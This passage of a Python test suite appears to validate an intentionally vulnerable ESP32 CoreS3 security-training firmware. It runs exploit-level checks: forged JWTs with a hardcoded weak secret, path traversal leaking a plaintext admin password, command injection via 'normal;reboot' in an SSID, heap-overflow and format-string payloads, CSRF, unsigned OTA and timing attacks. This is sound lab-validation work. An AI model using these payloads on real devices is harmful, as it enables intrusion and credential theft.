        return True, "Config shows 6-digit User/Admin PINs"
    return False, "Config missing 6-digit PINs"


def test_http_admin_status_mode():
    """HTTP: L11 forged token yields admin_mode true in /admin/status"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    tok = _forge_admin_token()
    if not tok:
        return False, "Failed to forge admin token"
    ok, status, headers, body = _http_get("/admin/status", params={"token": tok}, timeout=2)
    if not ok or status != 200:
        return False, f"GET /admin/status failed (status={status})"
    try:
        data = json.loads((body or b"").decode(errors="ignore"))
    except Exception as e:
        return False, f"Invalid JSON in /admin/status: {e}"
    if data.get("admin_mode") is True:
        return True, "admin_mode is true with forged token"
    return False, "admin_mode not true with forged token"


def test_http_l05_dump_secret_value():
    """HTTP: L05 dump leak contains jwtSecret=secret123"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 5}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=5 failed (status={status})"
        return None, f"/diag id=5 unavailable (status={status}); skipping harness-only dump check"
    text = (body or b"").decode(errors="ignore")
    if "jwtSecret=secret123" in text:
        return True, "Dump reveals jwtSecret=secret123"
    return False, "Expected jwtSecret not found in dump"


def test_http_l26_shared_key_value():
    """HTTP: L31 shared key equals secret123"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 26}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=26 failed (status={status})"
        return None, f"/diag id=26 unavailable (status={status}); skipping harness-only shared key check"

    text = (body or b"").decode(errors="ignore")
    m = re.search(r"Shared key:\s*(\S+)", text)
    if m and m.group(1) == "secret123":
        return True, "Shared key is secret123"
    return False, "Shared key mismatch"

# Additional per-lab validations (part 1)

def _expect_testlab_marker(lab_id, substr):
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": lab_id}, timeout=2)
    if not ok or status != 200:
        # In non-debug/student firmware builds, /diag may be absent.
        # Treat this as SKIP by default so students can run tests without DEV_TEST_HOOKS.
        # In CI or strict debug runs, set REQUIRE_TEST_LAB=1 to make this a hard failure.
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id={lab_id} failed (status={status})"
        return None, f"/diag id={lab_id} unavailable (status={status}); skipping harness-only check"
    if substr in (body or b"").decode(errors="ignore"):
        return True, f"Marker present: {substr[:32]}..."
    return False, f"Missing marker: {substr}"


def test_http_l04_bootloader_marker():
    return _expect_testlab_marker(4, "UART download mode allowed")


def test_http_l06_patch_bypass_marker():
    return _expect_testlab_marker(6, "PIN check patched bypass")


def test_http_l07_unsigned_ota_marker():
    return _expect_testlab_marker(7, "Unsigned OTA accepted")


def test_http_l08_rollback_marker():
    return _expect_testlab_marker(8, "OTA rollback marker set")


def test_http_l09_injection_marker():
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 9, "p1": "test;reboot"}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=9 failed (status={status})"
        return None, f"/diag id=9 unavailable (status={status}); skipping harness-only injection check"
    text = (body or b"").decode(errors="ignore")
    if "Command injection detected" in text and "Constructed command:" in text:
        return True, "Injection markers present"
    return False, "Expected injection markers missing"


def test_http_l12_camera_live_longinput():
    """HTTP: L12 buffer overflow - function pointer hijack (destructive).

    WARNING: This test crashes the device and requires power cycle to recover.

    This lab requires real exploitation:
    1. Find unlockAdmin() address via objdump/GDB
    2. Find buffer-to-function-pointer offset via GDB
    3. Craft payload with correct address

    The automated test just verifies the vulnerable endpoint accepts long input.
    Real exploitation must be done manually with GDB.
    """
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"

    # Test that the endpoint accepts input (vulnerable code path exists)
    ok, status, headers, body = _http_get("/camera", params={"exposure": "test"}, timeout=2)
    if not ok or status != 200:
        return False, f"/camera request failed (status={status})"

    text = body.decode(errors="ignore")
    if "Exposure set to:" not in text:
        return False, f"/camera response unexpected: {text[:100]}"

    # Test with long input to verify buffer overflow is possible
    ok2, status2, _, body2 = _http_get("/camera", params={"exposure": "A" * 100}, timeout=2)
    if not ok2:
        # Device crashed from overflow --do full reset + recovery
        print("     [~] Device crashed from buffer overflow, performing full recovery...")
        _reset_and_wait()
        return True, "Vulnerable endpoint exists; device crashed (expected - exploit requires GDB analysis)"

    return True, "Vulnerable endpoint exists; real exploit requires GDB to find function pointer offset and unlockAdmin() address"


def test_http_l09_apply_accepts_ssid():
    """HTTP: L09 safe test --verify /apply endpoint accepts SSID field (injection vector)."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    # Send a benign SSID (no semicolon = no injection = no reboot)
    ok, status, headers, body = _http_post_form("/apply", {"ssid": "TestNetwork", "pass": "x"}, timeout=3)
    if not ok:
        return False, f"POST /apply failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    if status == 200:
        return True, "POST /apply accepts SSID field (command injection vector present)"
    return False, f"POST /apply unexpected status={status}: {text[:100]}"


def test_http_l12_camera_accepts_exposure():
    """HTTP: L12 safe test --verify /camera accepts exposure param (overflow vector)."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    # Send short exposure value (won't overflow the buffer)
    ok, status, headers, body = _http_get("/camera", params={"exposure": "test"}, timeout=3)
    if not ok or status != 200:
        return False, f"/camera request failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    if "Exposure set to:" in text:
        return True, "Vulnerable /camera endpoint accepts exposure param (buffer overflow vector)"
    return False, f"/camera response unexpected: {text[:100]}"


def test_http_l14_heap_overflow_safe():
    """HTTP: L14 safe test --verify heap overflow diag with safe (short) input."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    # Send no p1 param (safe --no overflow)
    ok, status, headers, body = _http_get("/diag", params={"id": 34}, timeout=3)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=34 failed (status={status})"
        return None, f"/diag id=34 unavailable (status={status})"
    text = (body or b"").decode(errors="ignore")
    if "heap_overflow: safe" in text:
        return True, "Heap overflow diag present; safe input processed without crash"
    if "Heap Buffer Overflow" in text:
        return True, "Heap overflow vulnerability diag endpoint present"
    return False, f"Unexpected response: {text[:200]}"


def test_http_l16_i2c_spoof_marker():
    """HTTP: L19 I2C Spoofing & Buffer Overflow - verify I2C slave initialization"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 16}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=16 failed (status={status})"
        return None, f"/diag id=16 unavailable (status={status}); skipping harness-only I2C slave check"
    text = (body or b"").decode(errors="ignore")
    # Check for I2C slave initialization markers
    if "I2C slave address: 0x55" in text and "Buffer size: 32 bytes" in text:
        # Check if data was received (overflow test would need external I2C master)
        if "BUFFER OVERFLOW DETECTED" in text:
            return True, "I2C slave initialized and overflow detected (external I2C master used)"
        elif "Bytes received:" in text:
            return True, "I2C slave initialized at 0x55 with 32-byte buffer (ready for overflow test)"
    return False, "I2C slave initialization markers not found"


def test_http_l17_dma_overflow_marker():
    return _expect_testlab_marker(17, "SPI DMA Diagnostics")



def test_http_l18_l31_exif_presence():
    """HTTP: L21/L38 recovered JPEG mentions EXIF with real secrets"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    for lab_id in (18, 31):
        ok, status, headers, body = _http_get("/diag", params={"id": lab_id}, timeout=2)
        if not ok or status != 200:
            if os.environ.get("REQUIRE_TEST_LAB") == "1":
                return False, f"/diag id={lab_id} failed (status={status})"
            return None, f"/diag id={lab_id} unavailable (status={status}); skipping harness-only EXIF check"
        text = (body or b"").decode(errors="ignore")
        if "EXIF" not in text:
            return False, f"EXIF not present in L{lab_id:02d}"
        # L21 should contain real secrets (jwt_secret or admin PIN)
        if lab_id == 18:
            if "jwt_secret" not in text and "secret123" not in text:
                return False, f"L21 EXIF should leak jwt_secret, got: {text[:200]}"
    return True, "EXIF present in L21/L38 with real secrets"


def test_http_l20_ble_credential_leak():
    """HTTP: L23 BLE GATT credential leak exposes PINs (real vulnerability)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"

    ok, status, headers, body = _http_get("/diag", params={"id": 20}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=20 failed (status={status})"
        return None, f"/diag id=20 unavailable (status={status}); skipping BLE credential check"
    text = (body or b"").decode(errors="ignore")
    if "user_pin=" not in text:
        return False, f"Expected user_pin in GATT credential output, got: {text[:200]}"
    if "admin_pin=" not in text:
        return False, f"Expected admin_pin in GATT credential output, got: {text[:200]}"
    return True, f"L23 BLE GATT credential leak exposes PINs (real vulnerability)"


# Destructive validations (opt-in)

def test_http_l09_command_injection_live_reboot():
    """HTTP: L09 live command injection triggers device reboot (esptool reset after)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    # Trigger command injection via SSID field to execute 'reboot' through SerialShell
    ok, status, headers, body = _http_post_form("/apply", {"ssid": "normal;reboot", "pass": "x"}, timeout=2)
    # Device should reboot shortly; wait briefly then confirm it went down
    went_down = _wait_until_unreachable(timeout=15)
    if went_down or not ok:
        # Device rebooted --do full reset + recovery
        print("     [~] Device rebooted from injection, performing full recovery...")
        _reset_and_wait()
        return True, f"Device rebooted after injection (POST status={status})"
    if ok and status == 200:
        return True, "POST /apply accepted injection payload (reboot too fast to observe)"
    return False, f"POST /apply failed (status={status}); no reboot observed"


# Additional per-lab validations (part 2)

def test_http_l19_ble_gatt_overflow_marker():
    return _expect_testlab_marker(19, "BLE GATT Config Diagnostics")


def test_http_l21_ota_no_tls_marker():
    """L24: Verify OTA vulnerability explanation contains real attack details."""
    return _expect_testlab_marker(21, "OTA over HTTP")


def test_http_l22_dfu_unsigned_marker():
    """L25: Verify serial DFU vulnerability explanation contains real attack details."""
    return _expect_testlab_marker(22, "download mode")


def test_http_l23_usb_memleak_realistic():
    """L28: Verify USB memory leak returns actual hex dump (not just placeholder)."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 23}, timeout=2)
    if not ok or status != 200:
        return False, f"run_diagnostic?id=23 failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    # Should contain hex dump with real bytes (not hardcoded DE AD BE EF)
    if "Memory Leak" not in text:
        return False, f"Expected 'Memory Leak' in response, got: {text[:200]}"
    # Should show hex bytes
    if " 00 " not in text and " 55 " not in text and " 53 " not in text:
        return False, f"Expected hex dump with real bytes, got: {text[:200]}"
    return True, "L28 USB memory leak shows real hex dump"


def test_http_l24_usb_auth_race_marker():
    """L27: Verify TOCTOU auth bypass shows race condition analysis."""
    return _expect_testlab_marker(24, "TOCTOU")


def test_http_l25_rng_sequence_format():
    """L30 Weak RNG: exercise the real token API, not just /diag."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"

    tokens = []
    for _ in range(3):
        ok, status, headers, body = _http_get("/api/token", timeout=3)
        if not ok or status != 200:
            return False, f"/api/token failed (status={status})"
        try:
            data = json.loads((body or b"{}").decode())
        except Exception as e:
            return False, f"Invalid JSON from /api/token: {e}"
        token = data.get("token")
        if not isinstance(token, int):
            return False, f"Missing or non-int token field: {data!r}"
        tokens.append(token)

    # Basic sanity: tokens look like 32-bit integers
    if not all(0 <= t <= 0xFFFFFFFF for t in tokens):
        return False, f"Token out of 32-bit range: {tokens}"

    return True, "Weak RNG token API (/api/token) returns plausible 32-bit tokens"


def test_http_l27_timing_marker():
    """L32 Timing Attack: exercise the real /api/check_pin endpoint."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"

    # Functional check: wrong PIN should return FAIL (correct PIN is random per-device)
    wrong = "000000"

    ok1, status1, headers1, body1 = _http_post_form("/api/check_pin", {"pin": wrong}, timeout=3)
    if not ok1 or status1 != 200:
        return False, f"/api/check_pin failed for wrong PIN (status={status1})"
    if (body1 or b"").strip() != b"FAIL":
        return False, f"Expected FAIL for wrong PIN, got: {(body1 or b'').decode(errors='ignore')!r}"

    # Verify endpoint responds (timing side-channel is the actual lab attack)
    return True, "Real /api/check_pin endpoint reachable: wrong PIN returns FAIL"


def test_http_l28_cache_timing_marker():
    return _expect_testlab_marker(28, "timing_leak: yes")


def test_http_l29_sca_aes_target_marker():
    return _expect_testlab_marker(29, "AES-128 CPA target")


def test_http_l30_glitch_marker():
    return _expect_testlab_marker(30, "Glitch bypass succeeded")


def test_http_l32_crash_userpin_matches_nvs():
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    up, ap, err = _get_pins_from_admin_nvs()
    if err:
        return False, err
    ok, status, headers, body = _http_get("/diag", params={"id": 32}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=32 failed (status={status})"
        return None, f"/diag id=32 unavailable (status={status}); skipping harness-only crash forensics check"
    import re as _re
    text = (body or b"").decode(errors="ignore")
    m = _re.search(r"user_pin=(\d{6})", text)
    got = m.group(1) if m else None
    if got and got == up:
        return True, "Crash forensics user_pin matches NVS"
    return False, f"Crash user_pin mismatch (got={got}, nvs={up})"




def test_http_stream_noauth_headers():
    """HTTP: L18 MJPEG stream no-auth header check (/stream?noauth=1)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    # Use headers-only fetch to avoid stream timeout
    ok, status, headers, _ = _http_headers_only("/stream", params={"noauth": 1}, timeout=2)
    if not ok:
        return False, "Request to /stream failed"
    ctype = headers.get("Content-Type", "")
    if status == 200 and "multipart/x-mixed-replace" in ctype and "boundary=frame" in ctype:
        return True, "Stream responds with MJPEG multipart headers without auth"
    return False, f"Unexpected stream response (status={status}, Content-Type={ctype})"



# Deeper validations for leaks

def test_http_camleak_hex_regions():
    """HTTP: L17 camera frame debug shows new and previous frame bytes in hex regions"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/camera/debug-frame", timeout=2)
    if not ok or status != 200:
        return False, f"/camera/debug-frame failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    # Check for expected sizes and offsets (no thousands separators in firmware)
    if "Full frame size: 614400" not in text or "Preview frame size: 153600" not in text:
        return False, "Did not find expected full/preview frame sizes in response"
    if "Offset 0x0000:" not in text or "Offset 0x25800:" not in text:
        return False, "Expected hex dump offsets not present in response"
    if "Previous frame bytes visible after preview region." not in text:
        return False, "Expected explanation about previous frame bytes missing from response"
    # Ensure both new (0xBB) and old (0xAA) patterns are present somewhere
    if "BB " not in text or "AA " not in text:
        return False, "Expected 0xAA/0xBB patterns not found in hex dump"
    return True, "Camera frame debug returns expected hex dump with new and previous frame bytes"


def test_http_usb_memleak_pattern():
    """HTTP: L28 USB memory leak shows real hex dump with uninitialized stack bytes"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 23}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=23 failed (status={status})"
        return None, f"/diag id=23 unavailable (status={status}); skipping harness-only USB memleak check"
    text = (body or b"").decode(errors="ignore")
    # New realistic implementation shows actual hex dump
    if "USB_STATUS" in text or "Memory Leak Analysis" in text:
        # Should have hex bytes in the dump
        hex_pattern = re.search(r"[0-9A-F]{2}\s+[0-9A-F]{2}\s+[0-9A-F]{2}", text)
        if hex_pattern:
            return True, "L28 USB memory leak shows real hex dump with stack residue"
        return False, f"Expected hex dump in response, got: {text[:200]}"
    # Legacy format check
    if "USB control uninitialized bytes" in text and ("DE AD BE EF" in text or "DEAD BEEF" in text.replace(" ", "")):
        return True, "USB memory leak pattern present (DE AD BE EF)"
    return False, f"Expected USB memory leak analysis, got: {text[:200]}"


def test_http_admin_nvs_leak_json():
    """HTTP: Admin NVS JSON leaks sensitive PINs (requires token)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    tok = _forge_admin_token()
    if not tok:
        return False, "Failed to forge admin token"
    ok, status, headers, body = _http_get("/admin/nvs", params={"token": tok}, timeout=2)
    if not ok or status != 200:
        return False, f"GET /admin/nvs failed (status={status})"
    ctype = (headers or {}).get("Content-Type", "")
    try:
        data = json.loads((body or b"").decode(errors="ignore"))
    except Exception as e:
        return False, f"Invalid JSON in /admin/nvs: {e}"
    # Validate presence of sensitive fields and plausible formats
    import re as _re
    ap = data.get("admin_pin", "")
    up = data.get("user_pin", "")
    if _re.fullmatch(r"\d{6}", str(ap) or "") and _re.fullmatch(r"\d{6}", str(up) or ""):
        return True, "Admin/User PINs present in JSON (leak)"
    return False, "PIN fields missing or not 6-digit in /admin/nvs"


def test_http_l13_format_string_marker():
    """L13 Format String: verify format string vulnerability diagnostic."""
    return _expect_testlab_marker(33, "format_string_vuln: present")

def test_http_l14_heap_overflow_marker():
    """L14 Heap Overflow: verify heap overflow diagnostic (crashes device - esptool reset after)."""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/diag", params={"id": 34, "p1": "A" * 60}, timeout=2)
    if not ok:
        # Device crashed from heap corruption --do full reset + recovery
        print("     [~] Device crashed from heap overflow, performing full recovery...")
        _reset_and_wait()
        return True, "Heap overflow crashed device (expected - strcpy into 48-byte buffer)"
    if status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=34 failed (status={status})"
        return None, f"/diag id=34 unavailable (status={status}); skipping harness-only heap overflow check"
    text = (body or b"").decode(errors="ignore")
    if "heap_overflow: detected" in text:
        return True, "L14 heap overflow detected marker present"
    return False, f"Expected heap_overflow marker, got: {text[:200]}"

def test_http_l15_csrf_marker():
    """L15 CSRF: verify CSRF protection status diagnostic."""
    return _expect_testlab_marker(35, "csrf_protection: none")

def test_http_l25_wifi_deauth_marker():
    """L25 WiFi Deauth: verify PMF status diagnostic."""
    return _expect_testlab_marker(36, "wifi_pmf: disabled")

def test_http_l26_mdns_marker():
    """L26 mDNS Spoofing: verify mDNS diagnostic."""
    return _expect_testlab_marker(37, "mdns_auth: none")

def test_http_l36_secureboot_marker():
    """L36 Secure Boot: verify secure boot status diagnostic."""
    return _expect_testlab_marker(38, "secure_boot: disabled")

def test_http_l37_flashcrypt_marker():
    """L37 Flash Encryption: verify flash encryption status diagnostic."""
    return _expect_testlab_marker(39, "flash_encryption: disabled")


###############################################################################
# Exploit-Level Tests: Validate actual exploitation, not just markers
###############################################################################

def test_exploit_l07_ota_accepts_unsigned():
    """L07: Verify POST /ota accepts unsigned firmware URL without auth."""
    if not _reachable():
        return None, "Device not reachable"
    # POST a fake firmware URL - device will try to download and fail (502),
    # but the fact it accepts the request proves no auth + no signature check.
    # The device takes ~5s attempting the download before returning 502.
    ok, status, _, body = _http_post_form("/ota", {"url": "http://192.168.4.99:9/fake.bin"}, timeout=10)
    if not ok and status is None:
        return False, "POST /ota not reachable"
    text = (body or b"").decode(errors="ignore")
    # 200 = accepted, 502 = tried to download (proves it accepted the URL)
    if status in (200, 502):
        return True, f"OTA endpoint accepts unsigned firmware URL without auth (status={status})"
    return False, f"Unexpected OTA response: status={status} body={text[:100]}"


def test_exploit_l09_traversal_users():
    """L09: Verify /file?name=../users leaks user database with plaintext passwords."""
    if not _reachable():
        return None, "Device not reachable"
    ok, status, _, body = _http_get("/file", params={"name": "../users"}, timeout=3)
    if not ok or status != 200:
        return False, f"/file?name=../users failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    if "admin:" in text and "CoreS3_Admin_2024!" in text and "user:" in text:
        return True, "Path traversal leaks user database with plaintext admin password"
    return False, f"User database not fully exposed: {text[:200]}"


def test_exploit_l10_forged_jwt_admin_nvs():
    """L10: Verify forged JWT with cracked secret123 grants access to /admin/nvs."""
    if not _reachable():
        return None, "Device not reachable"
    tok = _forge_admin_token()
    if not tok:
        return False, "Failed to forge admin JWT"
    ok, status, _, body = _http_get("/admin/nvs", params={"token": tok}, timeout=3)
    if not ok or status != 200:
        return False, f"Forged JWT rejected by /admin/nvs (status={status})"
    text = (body or b"").decode(errors="ignore")
    if "admin_pin" in text and "user_pin" in text:
        return True, "Forged JWT grants admin access to /admin/nvs (full NVS dump)"
    return False, f"Unexpected /admin/nvs response: {text[:200]}"


def test_exploit_l12_format_string_leak():
    """L12: Verify format string via /file leaks stack data in serial output."""
    if not _reachable():
        return None, "Device not reachable"
    # Send %x format specifiers URL-encoded as %25x
    ok, status, _, body = _http_get("/file", params={"name": "%25x.%25x.%25x.%25x"}, timeout=3)
    # The format string is processed by DualSerial.printf in logAccess()
    # The HTTP response itself may not show the leak (it goes to serial),
    # but the endpoint should still respond (not crash) proving the vuln exists
    if ok and status in (200, 404):
        return True, "Format string payload accepted by /file endpoint (leak goes to serial)"
    return False, f"Format string test failed (status={status})"


def test_exploit_l13_heap_overflow_token():
    """L13: Verify heap overflow via /settings/profile overwrites auth token."""
    if not _reachable():
        return None, "Device not reachable"
    # 48 bytes padding + "ADMIN_TOKEN=granted" to overwrite adjacent token field
    payload = "A" * 48 + "ADMIN_TOKEN=granted"
    ok, status, _, body = _http_post_form("/settings/profile",
                                          {"description": payload}, timeout=3)
    if not ok or status is None:
        return False, f"/settings/profile not reachable (status={status})"
    text = (body or b"").decode(errors="ignore")
    if "admin_unlock: true" in text or "ADMIN_TOKEN=granted" in text:
        return True, "Heap overflow overwrites auth token - admin_unlock triggered"
    if status == 200 and "heap_overflow" in text:
        return True, "Heap overflow detected in /settings/profile response"
    return False, f"Heap overflow not confirmed: {text[:200]}"


def test_exploit_l14_csrf_no_origin_check():
    """L14: Verify POST endpoints accept requests with foreign Origin header."""
    if not _reachable():
        return None, "Device not reachable"
    # Send POST to /login with evil Origin - should NOT be rejected
    ok, status, _, body = _http_post_form("/login",
        {"username": "user", "password": "wrong"},
        headers={"Origin": "https://evil.example.com"}, timeout=3)
    if not ok or status is None:
        return False, f"POST /login not reachable (status={status})"
    # If server processes the request (any status code), CSRF protection is absent
    # A CSRF-protected endpoint would reject foreign Origin with 403
    if status != 403:
        return True, f"No CSRF protection: POST /login accepts foreign Origin (status={status})"
    return False, "Origin header was rejected - CSRF protection may be present"


def test_exploit_l15_broken_access_control():
    """L15: Verify /config leaks PINs (200) while /settings requires auth (401)."""
    if not _reachable():
        return None, "Device not reachable"
    # /config should be unauthenticated
    ok1, status1, _, body1 = _http_get("/config", timeout=3)
    if not ok1 or status1 != 200:
        return False, f"/config not accessible (status={status1})"
    text1 = (body1 or b"").decode(errors="ignore")
    has_pins = "Admin PIN:" in text1 and "User PIN:" in text1

    # /settings should require auth
    ok2, status2, _, _ = _http_get("/settings", timeout=3)

    if has_pins and (not ok2 or status2 in (401, 403)):
        return True, "/config leaks PINs (200) while /settings requires auth - broken access control"
    if has_pins:
        return True, f"/config leaks PINs without auth (broken access control)"
    return False, f"/config doesn't expose PINs: {text1[:100]}"


def test_exploit_l17_stream_auth_bypass():
    """L17: Verify /stream requires auth but /stream?noauth=1 bypasses it."""
    if not _reachable():
        return None, "Device not reachable"
    # Normal stream should require auth
    ok1, status1, _, _ = _http_headers_only("/stream", timeout=2)
    # Bypass stream should work without auth
    ok2, status2, headers2, _ = _http_headers_only("/stream", params={"noauth": 1}, timeout=2)
    ctype = (headers2 or {}).get("Content-Type", "")

    if ok2 and status2 == 200 and "multipart" in ctype:
        if not ok1 or status1 in (401, 403):
            return True, "Auth bypass confirmed: /stream=401 but /stream?noauth=1=200"
        return True, f"Auth bypass works: /stream?noauth=1 returns MJPEG (normal stream status={status1})"
    return False, f"Stream bypass test failed (normal={status1}, bypass={status2})"


def test_exploit_l28_rng_deterministic():
    """L28: Verify /api/token returns predictable tokens from fixed seed."""
    if not _reachable():
        return None, "Device not reachable"
    # Request multiple tokens and verify they are plausible 32-bit integers
    tokens = []
    for _ in range(3):
        ok, status, _, body = _http_get("/api/token", timeout=3)
        if not ok or status != 200:
            return False, f"/api/token failed (status={status})"
        try:
            data = json.loads((body or b"").decode(errors="ignore"))
            tok = data.get("token")
            if tok is not None:
                tokens.append(int(tok))
        except (json.JSONDecodeError, ValueError):
            return False, "Invalid token format from /api/token"
    if len(tokens) < 3:
        return False, "Could not collect 3 tokens"
    # Verify tokens are in valid 32-bit range
    if all(0 <= t <= 0x7FFFFFFF for t in tokens):
        # Verify a predicted token is accepted
        # ESP32 newlib LCG with seed 12345: first token = 134732914
        ok, status, _, body = _http_post_form("/api/token/verify",
            {"token": "134732914"}, timeout=3)
        if ok and status == 200:
            text = (body or b"").decode(errors="ignore")
            if "valid" in text.lower() or "ok" in text.lower():
                return True, "RNG is predictable: known seed token accepted by /api/token/verify"
        return True, f"Tokens are plausible 32-bit ints from weak RNG: {tokens[:3]}"
    return False, f"Tokens out of range: {tokens}"


def test_exploit_l29_key_reuse_multi_endpoint():
    """L29: Verify same JWT secret works across multiple admin endpoints."""
    if not _reachable():
        return None, "Device not reachable"
    tok = _forge_admin_token()
    if not tok:
        return False, "Failed to forge admin JWT"
    # Test same forged token on multiple protected endpoints
    endpoints_ok = []
    for ep in ["/admin", "/admin/status", "/admin/nvs"]:
        ok, status, _, _ = _http_get(ep, params={"token": tok}, timeout=3)
        if ok and status == 200:
            endpoints_ok.append(ep)
    if len(endpoints_ok) >= 2:
        return True, f"Single JWT secret grants access to {len(endpoints_ok)} endpoints: {endpoints_ok}"
    return False, f"Key reuse not confirmed (only {len(endpoints_ok)} endpoints accepted token)"


def test_exploit_l30_timing_measurable():
    """L30: Verify /api/check_pin response time varies with correct digits."""
    if not _reachable():
        return None, "Device not reachable"
    # Get actual user PIN from /config (unauthenticated - the check uses userPIN)
    ok, status, _, body = _http_get("/config", timeout=3)
    if not ok or status != 200:
        return False, "Cannot read config for PIN"
    text = (body or b"").decode(errors="ignore")
    pin_match = re.search(r"User PIN:\s*(\d{6})", text)
    if not pin_match:
        return False, "Cannot extract user PIN from /config"
    real_pin = pin_match.group(1)

    # Measure timing: wrong first digit vs correct first 2 digits
    wrong_pin = str((int(real_pin[0]) + 1) % 10) + "00000"
    partial_pin = real_pin[:2] + "0000"  # 2 correct digits = ~100ms extra delay

    def measure_pin(pin, samples=5):
        times = []
        for _ in range(samples):
            t0 = time.time()
            _http_post_form("/api/check_pin", {"pin": pin}, timeout=5)
            times.append(time.time() - t0)
        return sorted(times)[len(times) // 2]  # median

    t_wrong = measure_pin(wrong_pin)
    t_partial = measure_pin(partial_pin)

    delta = t_partial - t_wrong
    if delta > 0.03:  # >30ms difference indicates timing leak (expect ~100ms for 2 digits)
        return True, f"Timing side-channel detected: 2 correct digits add {delta*1000:.0f}ms (wrong={t_wrong*1000:.0f}ms, partial={t_partial*1000:.0f}ms)"
    return False, f"No measurable timing difference: wrong={t_wrong*1000:.0f}ms, partial={t_partial*1000:.0f}ms, delta={delta*1000:.0f}ms"


def main():
    print_header("CoreS3 Security Labs - Comprehensive Test Suite")

    # Test JWT tool (L10)
    print_header("Testing JWT Forging Tool (L10)")
    success, message = test_jwt_tool()
    print_test(10, "Weak JWT Secret - Tool Functionality", "PASS" if success else "FAIL", message)

    success, message = test_jwt_rfc7519_format()
    print_test(10, "Weak JWT Secret - RFC 7519 Format", "PASS" if success else "FAIL", message)

    success, message = test_jwt_weak_secret()
    print_test(10, "Weak JWT Secret - Weak Secret Verification", "PASS" if success else "FAIL", message)

    # Test code infrastructure (vulnerability hooks exist)
    print_header("Testing Code Infrastructure")
    success, message = test_device_test_file_exists()
    print_test(0, "Device Test File Exists", "PASS" if success else "FAIL", message)

    success, message = run_diagnostic_modules_exist()
    print_test(0, "Lab Module Implementations", "PASS" if success else "FAIL", message)

    success, message = test_camera_device_test_hooks()
    print_test(0, "CameraDevice Test Hooks", "PASS" if success else "FAIL", message)

    # Test L04/L05 firmware dump commands exist
    print_header("Testing Firmware Dump Commands")
    success, message = test_l05_firmware_dump_commands()
    print_test(5, "Firmware Dump Commands", "PASS" if success else "FAIL", message)

    # Device Unity tests: run all labs on hardware via PlatformIO
    print_header("Running Device Unity Tests")
    # Web/API Live Smoke Tests (optional; skipped if device not reachable)
    print_header("Web/API Live Smoke Tests (L09-L18)")

    def _report_http(lab, name, fn):
        try:
            # Health check: ensure device is up before running test
            if not _ensure_device_up():
                print_test(lab, name, "SKIP", "Device not reachable after recovery attempt")
                return
            res = fn()
            if not (isinstance(res, tuple) and len(res) == 2):
                raise Exception("Malformed test result")
            ok, msg = res
            if ok is None:
                print_test(lab, name, "SKIP", msg)
            else:
                print_test(lab, name, "PASS" if ok else "FAIL", msg)
        except Exception as e:
            print_test(lab, name, "FAIL", f"Exception: {e}")

    _report_http(9, "Path Traversal via /file", test_http_path_traversal)
    _report_http(10, "Weak JWT -> /admin with forged token", test_http_jwt_admin_access)
    _report_http(12, "Format string vulnerability marker", test_http_l13_format_string_marker)
    _report_http(14, "CSRF protection absent marker", test_http_l15_csrf_marker)
    _report_http(15, "Unauth Config leak via /config", test_http_config_leak)
    _report_http(16, "Camera frame debug via /camera/debug-frame", test_http_camera_frame_debug)
    _report_http(17, "MJPEG stream no-auth headers", test_http_stream_noauth_headers)

    # Deeper HTTP validations (beyond simple markers)
    print_header("Deeper HTTP Validations")
